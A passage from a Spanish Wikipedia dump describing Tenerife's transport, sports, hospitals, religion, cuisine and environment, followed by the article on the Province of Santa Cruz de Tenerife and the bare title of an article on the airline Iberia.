La isla cuenta también con una extensa red de guaguas tanto urbanas como interurbanas que conectan la gran mayoría de los núcleos de población. Para ello cuenta con estaciones de guaguas en todas las ciudades, como el Intercambiador de Transportes de Santa Cruz de Tenerife. El servicio regular de viajeros por carretera lo cubre la compañía Transportes Interurbanos de Tenerife, S.A.U.

Con la inauguración de la línea 1 del Tranvía de Tenerife, que une destacados sectores de la conurbación Santa Cruz-La Laguna, se puso en marcha la red tranviaria de Tenerife. Esta primera línea tiene como cabeceras el Intercambiador de Transportes de Santa Cruz de Tenerife y la lagunera Avenida de La Trinidad y conecta puntos como los dos centros hospitalarios de referencia de la isla o los campus universitarios. La segunda fase une los barrios de Tíncer (perteneciente a Santa Cruz) y La Cuesta (La Laguna), por medio de la línea 2, que se inauguró el día 30 de mayo de 2009. Esta línea tiene dos paradas de trasbordo con la línea 1: Hospital Universitario de Canarias y El Cardonal. Es el único tranvía existente en Canarias.

Perteneciente a la misma empresa que explota el Tranvía de Tenerife, en torno a 2017 se espera que comience, tras la aprobación de su construcción por el pleno del Cabildo Insular de Tenerife el 27 de abril de 2007, los trabajos para habilitar un tren que unirá Santa Cruz de Tenerife con el sur de la isla. El recorrido total será de 80 km y tiene previsto realizar su trayecto completo en 35 minutos y si tuviera que parar en todas las estaciones, lo haría en 45 minutos.

En Tenerife se pueden practicar gran cantidad de deportes, tanto al aire libre como en las distintas instalaciones disponibles en toda la isla. Como en el resto de España el deporte más prácticado y de moda es el fútbol, con su principal equipo representativo el Club Deportivo Tenerife.

Entre los deportes canarios practicados en la isla, cabe destacar los siguientes:

La lucha se desarrolla dentro de un círculo, generalmente de arena, denominado terrero. En él, dos luchadores se enfrentan agarrados intentando derribarse.
En Tenerife hay 26 terreros distribuidos por algunos municipios de la isla, utilizados por los 26 equipos masculinos federados y los dos equipos femeninos. La isla cuenta además con una liga escolar organizada por el cabildo y con un programa de promoción de este deporte puesto en marcha por instituciones, federaciones y clubes en el que participan 24 escuelas de lucha.

El juego del palo canario es un arte marcial que se practica entre dos jugadores que, sin llegar a hacer contacto con el cuerpo del adversario, realizan un combate con palos. El juego del palo, en su origen, no tenía carácter lúdico, sino que era un método de combate utilizado por los canarios precoloniales.

En Tenerife existen los siguientes clubes federados:

Similar al juego francés de la petanca, la bola canaria es un deporte que básicamente consiste en sumar puntos mediante el lanzamiento de unas bolas que hay que dejar lo más cerca posible de un objeto llamado mingue o boliche. Se juega en un terreno rectangular de arena o tierra de entre 18 y 25 m de largo y un ancho de entre 3,5 y 6 m. En Tenerife se compite a nivel federado existiendo una treintena de equipos que se organizan en tres categorías (primera, segunda y segunda B). En Tegueste existe una federación interna e independiente que funciona sólo en ese municipio y los equipos pueden ser mixtos.

En la isla se practican otras manifestaciones deportivas relacionadas con el ámbito rural, como el levantamiento de piedras y el arrastre de ganado, esta última con un creciente arraigo popular al disponer de un campeonato que organiza la Asociación Canaria de Arrastre. En abril suele celebrarse en Tegueste una exhibición de deportes rurales de Canarias.

Las condiciones de mar y el clima hacen que la isla sea idónea para la práctica de una amplia variedad de deportes acuáticos.

En la isla se practican tanto el surf tradicional, deslizándose sobre las olas encima de una tabla, como el windsurf en el que la tabla se desplaza gracias a una vela y como el más reciente kitesurf, en el que la fuerza necesaria para la navegación se obtiene de una cometa. La isla cuenta con diez escuelas, una de ellas participada por el cabildo, y diversos cursos dedicados al aprendizaje de estos deportes. Las principales zonas para la práctica de estas disciplinas son El Médano, Playa de Las Américas, la costa de Santa Cruz de Tenerife, Güímar y las costas del Valle de La Orotava, principalmente en la Playa del Socorro en Los Realejos. En algunas de ellas se han celebrado varias pruebas del Grand Slam puntuables para la World Cup en las disciplinas de "olas", "slalom" y "course race".
Al igual que ocurre con el surf y el windsurf, se pueden encontrar escuelas de submarinismo por toda la costa de Tenerife. En la isla existen hasta treinta puntos de inmersión repartidos por su litoral donde no sólo es posible descubrir una interesante flora y fauna marinas, sino también restos de barcos hundidos. Dentro de los mejores sitios para el buceo se encuentran, entre otros, Las Galletas, Playa Paraíso y la Punta de la Rasca al Sur, así como Garachico, Puerto de la Cruz o la Punta de Teno al Norte. En Tenerife concurren un gran número de clubes de buceo, tanto para la práctica como para el aprendizaje. Uno de ellos, también como en el caso del windsurf bajo las directrices del Cabildo Insular en el Centro Insular de Deportes Marinos (CIDEMAT). Destaca la presencia de especies como la tortuga boba, y de una colonia permanente de ballenas piloto, también bajo el nombre de calderones tropicales frente a las costas del Sur, avistándose igualmente con frecuencia el delfín mular. Estas dos especies de cetáceos viven de forma permanente en el canal existente entre Tenerife y La Gomera.

La natación es uno de los deportes más practicados ya sea en piscinas o en las costas de la isla. De este modo no sólo la natación, sino el waterpolo, con el Club Natación Martiánez en la División de Honor de la Liga Nacional Española, la natación sincronizada, con varias integrantes en el combinado nacional, o las pruebas de larga distancia (Copa Cabildo de Aguas Abiertas) son modalidades destacadas.
En Tenerife existen dieciséis equipos federados de natación:

Como es lógico, también se practican distintas modalidades de deportes acuáticos desarrolladas a bordo de embarcaciones. De estos deportes, se celebran en la isla distintas competiciones de Vela latina, Laser, Snipe, Crucero o de Optimist, por ejemplo.

En la isla tienen lugar eventos de índole insular, regional, nacional e incluso internacional.

Otro deporte que podríamos englobar en esta categoría es la pesca deportiva, existiendo clubes en la isla para ello. Aparte también es posible desarrollar excursiones marítimas con este fin. Además existe un campeonato insular de pesca de altura.

En otro sentido, los deportes aéreos como el paracaidismo y sobre todo el parapente juegan un papel importante. En Los Realejos se celebra el Festival Internacional de Parapente (Flypa). Existen en la isla más de 40 despegues frecuentados de los que los más señalados son:


El deporte del motor ocupa un lugar significativo en Tenerife. El motocross, el karting y los rallyes son tres variedades que encontramos en la isla. Durante todo el año se llevan a cabo competiciones de rally, en sus diferentes especialidades, valederas para el campeonato regional de Canarias. En cuanto a la modalidad de rallyes de "asfalto" se realizan varias pruebas. Estas son el Rally Norte, Rally Isla de Tenerife, Rally de Granadilla y Rally Villa de Adeje. La categoría de "montaña" suma siete pruebas (Subida a Los Loros, Subida a Guía de Isora, Subida a Güímar, Subida Arona-La Escalona, Subida a Tamaimo, Subida a San Miguel y Subida a La Guancha) en esta isla. Por otro lado, en la categoría de "tierra", en los municipios de Arico y Granadilla se realizan dos rallyes. Finalmente, en la modalidad de "slalom", destaca la prueba de Arico.

Está prevista la construcción de un circuito homologado para entrenamiento de la F1 en Atogo. Este circuito contaría con una distancia total de 4.068 metros en su mayor variante, con una recta de 819 metros. El ancho de la pista sería de 15m en la recta de meta, y 12m en el resto del circuito. Contará con 15 curvas (10 de izquierda y 5 de derecha) y una inclinación máxima del 5%. Tendrá 10 posibles variantes, y entre ellas una que permite 2 trazados simultáneos. El proyecto se encuentra actualmente adjudicado a falta de que comiencen las obras.

Además de los citados, en la isla se practican otros deportes de los que la siguiente es una pequeña relación:

El voleibol es el deporte más laureado de los existentes en la isla. Dentro de esta disciplina deportiva destaca en la categoría femenina, de manera clara, el campeón europeo Club Voleibol Tenerife que participa en la Superliga femenina española. Otros dos combinados a subrayar en este aspecto son el femenino Club Voleibol Aguere y el masculino Arona Playa de las Américas que compite en la Superliga masculina de voleibol. Fruto del éxito de los diferentes clubes de voleibol se observa un creciente interés por esta práctica deportiva en los escolares de Tenerife.
Como ocurre en gran parte del resto de España el fútbol es el deporte más practicado y seguido por el conjunto de los tinerfeños. La Federación Tinerfeña de Fútbol cuenta con un total de 305 equipos federados que compiten en las diferentes categorías en el conjunto de campos de fútbol que se reparten en el territorio isleño. Por otro lado, el máximo exponente tinerfeño en cuanto a fútbol se refiere es el Club Deportivo Tenerife, equipo que ha jugado trece temporadas en Primera División. Sus grandes hitos deportivos son dos quintos puestos en la Liga (1993 y 1996), la disputa de unas semifinales de la Copa del Rey contra el Celta de Vigo y la disputa de unas semifinales de la Copa de la UEFA contra el FC Schalke 04 (1997). Actualmente forma parte de la Segunda División española.

En Tenerife también existe la posibilidad de practicar el baloncesto. Al igual que en el caso del fútbol, voleibol, e incluso balonmano, karate, etc. muchos colegios e institutos ofrecen la posibilidad de aprender y profundizar en la práctica de este deporte. Además se hallan en la isla diversos equipos federados. En concreto, en la liga LEB se integran dos equipos de esta isla: el Tenerife Rural y el Club Baloncesto Canarias.En el verano de 2010, el Club Baloncesto Canarias realizó un nuevo proceso de fusión con el CB Tenerife, pasando a denominarse Isla de Tenerife Socas Canarias y trasladando la sede del club al Pabellón Santiago Martín.

La extensa red de caminos existentes en la isla permite la práctica del senderismo. Son numerosas las asociaciones o compañías que organizan estas excursiones por los montes, montañas o caminos rurales de la isla. En esta línea se encuentra el descenso de barrancos, una especialidad que permite recorrer lugares inaccesibles y de gran valor natural y paisajístico. Lo puede practicar cualquier persona ya que hay barrancos para cualquier nivel. Básicamente consiste en recorrer los caminos que ha abierto el agua entre las montañas a lo largo de miles de años. Atendiendo a las características y singularidades de cada barranco se requieren cuerdas y material de escalada para practicar con la técnica del rappel si fuera necesario. A pesar de que hay barrancos en los que esta práctica está prohibida son cuatro los barrancos especialmente habilitados para el descenso:

El golf es un deporte que en Tenerife cuenta con unas buenas y extensas instalaciones para su práctica. No obstante, es una disciplina orientada principalmente al turismo que deja unas importantes cantidades de dinero en la isla pero que como contrapartida consume una gran cantidad de los recursos hídricos limitados disponibles. Existen en total nueve campos de golf:

El Tenerife Ladies Open, torneo de golf femenino que se disputa en el Golf Costa Adeje, es un evento integrado dentro del circuito europeo femenino. Habiendo disputado ocho ediciones, cuenta con prestigio dentro del calendario del circuito europeo y está considerado como el referente en cuanto a torneos profesionales femeninos en el ámbito nacional.

En la isla también se practican deportes como el ciclismo, el pádel, el tenis, el squash, la hípica, el judo, el frontenis, el atletismo con el Club Atletismo Tenerife CajaCanarias como referente y la ultramaratón CajaMar Tenerife Bluetrail, la carrera más alta de España y segunda de Europa.

Los principales centros sanitarios de la Isla son el Hospital Universitario de Canarias y el Hospital Universitario Nuestra Señora de Candelaria. Ambos son hospitales de tercer nivel, es decir, de atención especializada y de referencia en algunas especialidades para toda Canarias e incluso España. Están incorporados a la red docente de la Universidad de La Laguna. Ambos complejos hospitalarios son gestionados por el Servicio Canario de Salud. El Hospital Universitario Nuestra Señora de Candelaria es el complejo hospitalario más grande de las Islas Canarias.

En 2012 fue abierto en el municipio de Icod de los Vinos el nuevo Hospital del Norte de Tenerife con cobertura para los municipios norteños de la isla y desde 2015 entró en funcionamiento el Hospital del Sur de Tenerife situado en el municipio de Arona con cobertura para los municipios sureños. Estos son dos nuevos hospitales periféricos en las zonas norte y sur de la isla que cuentan de acuerdo a su clasificación como hospitales de segundo nivel, con servicios de hospitalización, diagnóstico avanzado, urgencias, cirugía mayor ambulatoria, rehabilitación, etc. Los hospitales de tercer nivel y los de segundo nivel junto con los 39 centros de atención primaria y los múltiples centros de atención especializada completan las infraestructuras sanitarias de Tenerife.

Al igual que ocurre en el resto de España, y según las encuestas, la sociedad tinerfeña se declara mayoritariamente católica, aunque la mayoría de ésta tampoco es practicante. No obstante, las crecientes corrientes migratorias (turismo, inmigración, etc.) están incrementando el número de fieles de otras religiones que se dan cita en la isla, como el Islam, el Hinduismo, el Budismo, confesiones cristianas evangélicas, el Judaísmo y Religiones afroamericanas. Confesiones minoritarias destacadas en la isla son: las Religiones chinas, el Bahaísmo y una forma de neopaganismo autóctono, la Iglesia del Pueblo Guanche, entre otras.

Son numerosas las advocaciones católicas que existen, sin embargo, aquí tiene lugar cada año la peregrinación más importante del archipiélago, debido a la celebración de la festividad de la Virgen de Candelaria (Patrona de Canarias), quien representa la unión de las culturas guanche y española. Los guanches tomaron como propia la imagen que los misioneros de Lanzarote y Fuerteventura dejaron en una playa próxima a la actual Villa Mariana de Candelaria. A partir de ahí, la historia y la leyenda de esta imagen, se entrelazan y dan paso al culto y peregrinación que hasta nuestros días mantienen los habitantes de las islas y de Tenerife en particular. Por otro lado, hay que nombrar también a la Virgen de los Remedios, patrona de la isla de Tenerife y de la Diócesis de San Cristóbal de La Laguna (la cual engloba a toda la provincia), la festividad de la Virgen de los Remedios es el 8 de septiembre. Otra imagen venerada en la isla y en Canarias es el Santísimo Cristo de La Laguna celebrado el 14 de septiembre. De la misma manera, recibe especial veneración el Santísimo Cristo de los Dolores de Tacoronte.

En Tenerife nacieron dos de los más grandes misioneros que han existido en el continente americano y que a su vez son venerados como santos de la Iglesia católica: Pedro de San José Betancur y José de Anchieta. El primero nació en Vilaflor en el sur de la isla, fue misionero en Guatemala y fundador de la Orden de los Betlemitas (la primera orden religiosa nacida en el continente americano). El segundo nacido en San Cristóbal de La Laguna fue misionero en Brasil, y fue el fundador de São Paulo y uno de los fundadores de Río de Janeiro. Otra personalidad religiosa destacada es la monja María de León Bello y Delgado ("La Siervita"), nacida en El Sauzal y cuyo cuerpo permanece incorrupto. Esta religiosa con fama de santidad, es muy venerada en todo el archipiélago.

El 2 de febrero el día litúrgico de la Virgen de Candelaria (Patrona del Archipiélago Canario) es festivo en la isla. San Miguel Arcángel es el Santo Patrono de la isla de Tenerife y del Ayuntamiento de La Laguna. De hecho su imagen aparece en el escudo insular, que fue concedido por Fernando el Católico, el 23 de marzo de 1510, en nombre de su hija la reina Doña Juana.

La isla de Tenerife se divide en trece arciprestazgos pertenecientes a la Diócesis de San Cristóbal de La Laguna, diócesis que tiene su sede en la isla. Estos son los de: "Icod", "Isora", "Güímar", "Granadilla", "La Cuesta", "La Laguna", "La Orotava", "La Salud", "Ofra", "Taco", "Tacoronte", "Tegueste" y "Santa Cruz de Tenerife".

Entre los seguidores del Islam, en Tenerife se encuentra la sede de la Federación Islámica de Canarias, que es el organismo que agrupa a las asociaciones y comunidades de religión musulmana del archipiélago canario.

En cuanto a los principales núcleos o templos religiosos destacan:



Hay otros edificios religiosos de cierta relevancia, como puede ser la Iglesia de la Concepción, la de San Agustín y Santo Domingo en La Orotava, el Templo de Nuestra Señora de la Peña de Francia, en el Puerto de la Cruz, el de San Marcos Evangelista en Icod de los Vinos o el de Santa Ana en Garachico, así como la Iglesia de la Concepción de Santa Cruz de Tenerife, la Cueva-Santuario del Santo Hermano Pedro, al sur de la isla, que es lugar de peregrinación, entre otros.

Otro edificio religioso importante de la isla es el Templo Masónico de Santa Cruz de Tenerife, el cuál está considerado como el más bello ejemplo de templo masónico en España, y fue de hecho, el mayor centro masónico de España hasta la ocupación por los militares del régimen franquista.

Como resulta lógico por la influencia marina, los productos del mar gozan aquí de cierta abundancia tanto en cantidad como en variedad. Entre las especies más apreciadas están las viejas, y también, entre otros, la sama, el bocinegro, la salema, el cherne, el mero... Destacan asimismo los diversos tipos de túnidos que abundan en sus costas. Las caballas, sardinas y chicharros también deben ser citadas entre los pescados más consumidos. Otra especie que disfruta de cierta fama es la morena, que se suele servir frita. Estas variedades marinas se suelen preparar simplemente cocidas, o a la espalda, a la sal, etc. Es frecuente que se acompañen con mojo y papas arrugadas.

En el apartado de carnes, es un plato muy popular la típica carne de fiesta (tacos de cerdo adobados) que se prepara para los festejos de los pueblos en ventorrillos (puestos de feria), bares y casas particulares. El conejo en salmorejo, el cabrito, y por supuesto el vacuno, el porcino y las carnes de ave son también consumidas habitualmente. Otro plato típico de la gastronomía tinerfeña es el puchero canario que, a semejanza con otros cocidos españoles, representa una de las ollas más completas de la culinaria nacional. El contenido del puchero puede, evidentemente, variar pero es rico en verduras, hortalizas, legumbres y carnes.

Tanto los pescados como las carnes suelen acompañarse con papas arrugadas. Es éste un plato típico del conjunto de Canarias que responde simplemente a la forma de cocinar las papas. Con agua, mucha sal, y sin pelar. En 2016 fueron proclamadas maravilla gastronómica de España en un concurso promovido por Allianz Global Assistance, consiguiendo el primer puesto mediante voto popular a través de internet.

Una salsa típica canaria que da un cierto sabor picante a las comidas.

Con esta palabra, seguramente de ascendencia portuguesa, se designan las salsas típicas de las islas. Los mojos constituyen un auténtico mundo de sabores, colores, texturas, etc., entre los que se encuentran el mojo de cilantro, de perejil, de pimentón y el distinguido mojo picón a base de pimienta. No obstante el abanico de estas salsas es muy amplio y permite el uso de distintos ingredientes en su elaboración como almendras, queso, azafrán, pan frito, entre otras posibilidades.

Es un acompañamiento para algunas carnes y para ciertos pescados.

En cuanto finalizó la conquista de las islas, una de las primeras actividades económicas de las que se pusieron en marcha inmediatamente fue la elaboración y el mercado del queso. Era una forma racional de rentabilizar la pequeña ganadería existente. Como anécdota, podemos apuntar que el queso fue incluso utilizado como moneda de cambio y compraventa. Desde entonces este es un alimento fundamental en las zonas agrarias.

Viene a ser otro de los platos más comúnmente elaborados y consumidos. Destacan los producidos en granjas de Arico, La Orotava o Teno. A su vez, son diversas variedades las que existen: quesos tiernos, curados, semicurados, ahumados… y son en su mayoría artesanales. Hoy en día predominan los quesos de cabra, aunque en ocasiones se confeccionan con ciertas cantidades de leche de oveja o de vaca. Suelen servirse a modo de entrante o simplemente de tentempié. Los quesos canarios gozan de una buena crítica internacional, entre otras cosas, por su suavidad y por su sabor, dotándolos de una personalidad que los diferencia de otros quesos europeos. En concreto, el queso tinerfeño curado de cabra con coberturas de pimentón y gofio de la Quesería de Arico ha resultado premiado en su categoría como mejor queso del mundo en la final de los "World Cheese Awards 2008" celebrados en Dublín.

Uno de los últimos estudios realizados revela que en Tenerife se producen aproximadamente 3.400 toneladas al año, lo que supone el 50% de la producción de la provincia y un 25% de todo el Archipiélago. A día de hoy existen 75 queserías artesanales, según el Registro General Sanitario de Alimentos.

Actualmente los quesos de Tenerife disponen de una marca de garantía potenciada por la Fundación Tenerife Rural para homologar su calidad. Con esta marca de garantía, se intenta dar a conocer las principales cualidades de los quesos, valorizar el producto y mejorar su comercialización.

El gofio es uno más de los elementos tradicionales de la cocina canaria y particularmente de Tenerife. Se realiza con granos de cereales que son tostados y posteriormente molidos. El género de mayor consumo en la isla es el de trigo, aunque existen otros tipos como el de millo o en menor medida el de garbanzo. Es también relativamente frecuente aquel de tipo mixto, trigo-millo. Desde incluso antes de la conquista de Canarias ya servía de sustento para los guanches. En posteriores tiempos de hambruna y escasez de alimentos formó parte de la dieta popular canaria. Hoy en día se utiliza como plato único (gofio escaldado) o como complemento en platos de distinta índole: carnes, pescados, potajes, postres. También son típicas las denominadas pellas de gofio, en las que este ingrediente principal se amasa junto a otros (miel, azúcar, agua, almendras, pasas, queso, etc.) y son servidas a modo de pequeñas formas redondeadas. Las pellas de gofio son frecuentemente degustadas en romerías, ferias tradicionales y vendimias. Incluso algún cocinero de prestigio ha confeccionado helados de gofio recibiendo buena crítica al respecto.
La repostería en Tenerife se encuentra representada y fuertemente influenciada por la repostería palmera, con exquisiteces como el bienmesabe, la leche asada, el Príncipe Alberto, el frangollo, los huevos moles, el quesillo y un largo etcétera. Del mismo modo, los rosquetes, las truchas, y diversos tipos de pasteles, entre los que se encuentran los laguneros y los singulares rosquetes de Guía de Isora, forman parte de este capítulo del recetario.
El cultivo de la vid en el archipiélago y especialmente en Tenerife nace tras la conquista, cuando los colonizadores traen variedades de viñas y comprueban la nobleza que adquirían los caldos canarios. En los siglos XVI y XVII, el vino alcanza un gran peso en la economía tinerfeña pues son muchas las familias que se dedicaban a su cultivo y posterior negocio. Especial mención merece el malvasía canario, que llegó a ser considerado el mejor vino del mundo y era ansiado por las cortes europeas y las mayores bodegas de Europa y América. Escritores como William Shakespeare o Walter Scott hacen referencia en algunas de sus obras a estos vinos. La isla presenta actualmente cinco denominaciones de origen: Abona, Valle de Güímar, Valle de La Orotava, Tacoronte-Acentejo e Ycoden-Daute-Isora.

Canarias, y por ende Tenerife, no tienen grandes niveles de contaminación atmosférica gracias, por un lado, a la escasez de fábricas e industrias y, por otro, al régimen de los vientos alisios que alejan las masas de aire contaminadas de las islas. Según datos oficiales ofrecidos por las consejerías de Sanidad y de Industria, Tenerife es uno de los lugares de España con menor índice de contaminación atmosférica con un promedio medio-bajo. No obstante, las principales fuentes contaminantes de la isla son las centrales térmicas de Las Caletillas y Granadilla, el tráfico rodado y la refinería de Santa Cruz de Tenerife.

Además, en la isla de Tenerife al igual que en la de La Palma debe controlarse la contaminación lumínica, por su afección a los observatorios astrofísicos situados en las cumbres de estas islas.
En cuanto a lo concerniente a la calidad de las aguas, aquellas de consumo se encuentran todas calificadas como aptas, aunque en algunos puntos tiene un sabor considerado desagradable, por tener origen en acuíferos salinizados o en agua marina desalada. Algo similar ocurre en referencia a las aguas de baño, ya que todas las playas de la isla de Tenerife han sido catalogadas por el Ministerio de Sanidad y Consumo como aguas aptas para el baño de muy buena calidad.


En los últimos años, la isla ha sido receptora de rodajes de superproducciones cinematográficas. Algunos de los rodajes más importantes realizados en la isla son:






Igualmente, la isla ha sido escogida para grabaciones musicales y como escenario paisajístico para videoclips:





Entre las importantes obras literarias que tienen por trasfondo la isla o se hace alusión a ella, destacan: La señorita de compañía y El hombre del mar, ambos de Agatha Christie, La cueva de las mil momias de Alberto Vázquez-Figueroa, El picnic de los ladrones de Leslie Charteris, El Sarcófago de las tres llaves de Pompeyo Reina Moreno y Atentado de Mariano Gambín, entre otras.

Existen diferentes lugares en el mundo que comparten con esta isla el topónimo de "Tenerife", en su mayoría por la presencia de isleños en esos lugares. También la isla ha dado nombre a lugares situados incluso fuera del Planeta Tierra:






</doc>
<doc id="6475" url="https://es.wikipedia.org/wiki?curid=6475" title="Provincia de Santa Cruz de Tenerife">
Provincia de Santa Cruz de Tenerife

La Provincia de Santa Cruz de Tenerife es una provincia española de la comunidad autónoma de Canarias, formada por las islas de La Palma, La Gomera, El Hierro y Tenerife, así como por una serie de roques adyacentes (como los de Salmor, Fasnia, Bonanza, Garachico y Anaga). La provincia de Santa Cruz de Tenerife es la provincia española más occidental y meridional. Además es la tercera provincia española más montañosa por desnivel del terreno, aunque la primera en altitud máxima, por encontrarse en ella la máxima altitud del país, el pico Teide (3718 metros). 

En 2017, la provincia contaba con 1.007.641 habitantes. Es la segunda provincia canaria en población, aunque la primera en densidad. La capital de la provincia es la ciudad de Santa Cruz de Tenerife, situada en la isla de Tenerife, la isla más poblada de Canarias y la más poblada de España. También es la capital de la Comunidad Autónoma de Canarias junto a Las Palmas de Gran Canaria.

La provincia surgió en 1833 con la división de España en 49 provincias, formando Canarias una única provincia con capital en Santa Cruz de Tenerife.

No obstante, en 1927 la mitad oriental se separó para formar la provincia de Las Palmas y la Provincia de Canarias se la denominó Provincia de Santa Cruz de Tenerife, pues dejó de englobar a todo el archipiélago. A partir de ese año, fue emitido un decreto por el cuál la ciudad de Santa Cruz de Tenerife debía compartir la capitalidad del archipiélago con Las Palmas de Gran Canaria, que es como permanece en la actualidad.

Actualmente fuera de Canarias, esta provincia es también conocida con la denominación de Tenerife, que en realidad es su isla más poblada y extensa.

A los naturales de la isla de Tenerife se les denomina "tinerfeños" o "chicharreros", aunque esta última no es del todo correcta, ya que realmente los chicharreros son solamente los naturales de la ciudad de Santa Cruz de Tenerife; a los de La Palma, palmeros; a los de El Hierro, herreños y a los de La Gomera, gomeros o colombinos.

Las islas que integran la provincia de Santa Cruz de Tenerife suelen ser comúnmente denominadas ""islas occidentales"", para diferenciarlas de las islas de la provincia de Las Palmas, denominadas ""islas orientales"" por su situación geográfica al este de esta provincia. En ocasiones, también se ha utilizado para la provincia de Santa Cruz de Tenerife la denominación de ""Islas Nivarienses"", aunque esta denominación surge por influencia de la diócesis católica de esta provincia, llamada "Diócesis Nivariense". En este sentido, la provincia de Las Palmas por su parte se denomina como ""Islas Canarienses"", también por el nombre de su diócesis.

A diferencia de la mayoría de las provincias de España, la provincia de Santa Cruz de Tenerife (al igual que la de Las Palmas) carece de un órgano administrativo común para toda la provincia. Las competencias que normalmente ostentan las Diputaciones Provinciales se las reparten entre el Gobierno de Canarias y los Cabildos Insulares. El "Boletín Oficial de la Provincia de Santa Cruz de Tenerife" es editado por el Gobierno de Canarias.

La Provincia de Santa Cruz de Tenerife está formada por cuatro islas mayores; Tenerife, La Palma, La Gomera y El Hierro. Y una serie de roques e islotes deshabitados; Salmor, Fasnia, Bonanza, Garachico y Anaga.

Las islas mayores son:

Tenerife es la isla más extensa de Canarias, con una superficie de 2.034,38 km². Además, es la más poblada del archipiélago, con 894.636 habitantes (2017) y una densidad de población de 445 hab./km², y la isla más poblada de España. Los municipios más poblados de la isla son Santa Cruz de Tenerife (222.643 habitantes), San Cristóbal de La Laguna (152.222 habitantes) y Arona (79.377 habitanes). La ciudad de Santa Cruz de Tenerife (206.325 habitantes) es sede del Parlamento de Canarias, Capitanía General de Canarias y del Cabildo de Tenerife. Es además la ciudad más poblada del municipio y de la provincia y capital insular, provincial y de la Comunidad Autónoma de Canarias conjuntamente con Las Palmas de Gran Canaria. La ciudad de La Laguna (32.078 habitantes) es la segunda más poblada de la isla y tercera del archipiélago, está declarada Patrimonio de la Humanidad por la Unesco, y en ella tiene sede la Universidad de La Laguna. Por su parte, también en esta ciudad se encuentra la sede del Consejo Consultivo de Canarias, que es el supremo órgano consultivo de la Comunidad Autónoma de Canarias. Destacan también, por su importancia turística, otros cuatro municipios: La Orotava, Puerto de la Cruz en el norte, y Arona y Adeje en el sur. Hay que citar además la Villa Mariana de Candelaria, donde se encuentra la imagen de Virgen de Candelaria, Patrona del Archipiélago Canario. La patrona de la Diócesis Nivariense (que engloba la provincia de Santa Cruz de Tenerife) es la Virgen de los Remedios, que se venera en La Laguna. Tenerife es conocida, en virtud de su clima, como "la isla de la eterna primavera", y cuenta con diversas playas de arena fina oscura volcánica y diversos parques naturales. Entre otros espacios naturales protegidos, alberga el Parque nacional del Teide, también declarado Patrimonio de la Humanidad por la Unesco: es uno de los parques nacionales más visitados del mundo y en él se encuentra el pico del Teide, que con sus 3.718 msnm representa el techo de España y el tercer volcán más grande del mundo desde su base. Además destacan también en la isla otros espacios naturales de gran valor ecológico, como el Parque Natural de la Corona Forestal, es cuál es el mayor espacio natural protegido de las Islas Canarias, y los parques rurales de Anaga (en el este) y de Teno (en el oeste de la isla). El Macizo de Anaga es el lugar que cuenta con mayor cantidad de endemismos de Europa y que es Reserva de la Biosfera por la UNESCO desde 2015. Geológicamente es importante también destacar la Cueva del Viento-Sobrado, la cuál es el tubo volcánico más grande de la Unión Europea y uno de los más grandes del mundo, de hecho es el quinto. La isla es conocida internacionalmente por su carnaval considerado el segundo más importante del mundo.

La Palma, con 81.350 habitantes (2017), sus 708,32 km² son en su totalidad Reserva de la Biosfera. Ha tenido actividad volcánica reciente, apreciable en el volcán Teneguía, que entró en erupción por última vez en 1971. Además, es la segunda isla más alta de Canarias, con el Roque de los Muchachos (2.426 metros) como punto más elevado. Este pico se halla en los límites del Parque nacional de la Caldera de Taburiente, y en sus inmediaciones está emplazado el Observatorio del Roque de los Muchachos del Instituto de Astrofísica de Canarias: en él se encuentra el Gran Telescopio Canarias, que con su espejo principal de 10,40 m de diámetro se cuenta entre los telescopios ópticos más grandes del planeta. Por su exuberante vegetación, La Palma es conocida también como la "Isla Bonita". Su capital es Santa Cruz de La Palma (13.842 en la capital, 17.084 habitantes en el municipio), ciudad donde tiene su sede el Diputado del Común del Parlamento de Canarias (cargo equivalente al Defensor del Pueblo, pero a nivel autonómico), y el municipio más poblado es Los Llanos de Aridane (20.766 habitantes).

La Gomera tiene una superficie de 369,76 km² y es la segunda isla menos poblada de las siete mayores, con 20.976 habitantes (2017). Geológicamente es una de las más antiguas del archipiélago. La capital insular es San Sebastián de La Gomera (8.965 habitantes). En La Gomera se encuentra el Parque nacional de Garajonay, declarado por la Unesco en 1986 Patrimonio de la Humanidad, que representa un buen ejemplo de bosque de laurisilva. Por su parte el Silbo gomero (lenguaje silbado practicado por algunos habitantes de la isla), también es Patrimonio de la Humanidad desde 2009. La isla fue el último territorio que tocó Cristóbal Colón antes de llegar a América en su viaje de descubrimiento de 1492: por ello es también conocida como la "Isla Colombina".

El Hierro es la isla más occidental del archipiélago, y entre las islas principales, es la más pequeña, con 268,71 km², y la menos poblada, con 10.679 habitantes (2017). Su capital es Valverde (4.995 habitantes). Toda la isla fue declarada Reserva de la Biosfera en 2000. Es conocida por sus ejemplares de sabina inclinados por el viento; por el antiguo Garoé o Árbol Santo; por sus lagartos gigantes, y porque en el pasado el meridiano 0º tomaba como referencia la Punta de Orchilla, situada en el oeste de la isla. Desde el siglo XVIII, se viajaba a esta isla para tomar las aguas curativas del Pozo de Sabinosa, o Pozo de la Salud. Aquí nació la "cantadora" y tamborilera Valentina la de Sabinosa, figura del folclore canario. La isla también destaca por sus fondos marinos y sus centros de buceo. Entre octubre de 2011 y marzo de 2012 tuvo lugar una erupción submarina, ya concluida. El cono volcánico submarino se encuentra a 88 metros de profundidad, cerca de la localidad de La Restinga, en el Mar de las Calmas. La erupción de El Hierro de 2011 fue noticia en todos los medios de comunicación.



La provincia de Santa Cruz de Tenerife es la 43.ª de España en que existe un mayor porcentaje de habitantes concentrados en su capital (20,10 %, frente a 31,96 % del conjunto de España).

La provincia de Santa Cruz de Tenerife cuenta con 3 Parques nacionales, siendo la provincia española que más parques nacionales tiene: (Las Cañadas del Teide, La Caldera de Taburiente y Garajonay). Tres lugares en Canarias han sido declarados Patrimonio de la Humanidad por la UNESCO, y todos ellos se encuentran en esta provincia, estos son: Parque nacional de Garajonay en 1986 y el Parque nacional del Teide en 2007. También la ciudad de San Cristóbal de La Laguna fue declarada por la Unesco en 1999, Patrimonio de la Humanidad. Además son declaradas en su totalidad Reservas de la Biosfera las islas de La Palma en el año 1983, aunque posteriormente en 1997 y 2002 se le han añadido terrenos a la reserva hasta alcanzar la totalidad de la isla, El Hierro en el año 2000 y La Gomera en 2012. Además, desde 2015 el Macizo de Anaga en Tenerife también tiene la consideración de Reserva de la Biosfera.



</doc>
<doc id="6477" url="https://es.wikipedia.org/wiki?curid=6477" title="Iberia (aerolínea)">
Iberia (aerolínea)

